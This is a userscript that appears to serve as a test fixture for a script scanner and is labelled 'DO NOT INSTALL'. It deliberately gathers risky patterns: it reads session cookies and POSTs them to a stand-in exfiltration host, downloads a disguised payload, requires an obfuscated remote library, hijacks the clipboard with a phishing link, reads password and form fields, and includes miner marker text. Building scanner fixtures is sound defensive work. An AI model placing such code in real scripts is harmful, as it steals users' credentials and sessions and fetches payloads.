// ==UserScript==
// @name         Example: RISKY test fixture — DO NOT INSTALL
// @namespace    https://scriptsentry.example/fixtures
// @version      6.6.6
// @description  SCANNER TEST FIXTURE ONLY. This file deliberately contains every
// @description  risky pattern ScriptSentry scans for, so the Security Report
// @description  and the unit tests have something to catch. DO NOT INSTALL.
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_cookie
// @grant        GM_setClipboard
// @grant        GM_download
// @connect      *
// @require      https://cdn.evil-cdn-example.invalid/obfuscated-lib.js
// ==/UserScript==

/* DO NOT INSTALL — scanner test fixture. Nothing here should ever run. */
(function () {
  "use strict";
  var _0x1a2b3c = "packed";
  var _0x4d5e6f = "strings";
  var _0x7a8b9c = "everywhere";
  eval("console.log('fixture')");
  var session = document.cookie;
  GM_cookie.list({}).then(function () {});
  GM_setClipboard("https://phishing.example.invalid/");
  GM_download("https://evil-cdn-example.invalid/payload.bin", "update.bin");
  GM_xmlhttpRequest({
    method: "POST",
    url: "https://collector.evil-example.invalid/exfil",
    data: session + _0x1a2b3c + _0x4d5e6f + _0x7a8b9c
  });
  fetch("https://telemetry.unknown-example.invalid/beacon");
  var pw = document.querySelector('input[type="password"]');
  var formData = new FormData(document.forms[0]);
  localStorage.setItem("fixture", "stored");
  // cryptonight / coinhive style browser-mining markers (fixture text only):
  var minerNote = "xmrig cryptonight miner would start here in a real bad script";
})();
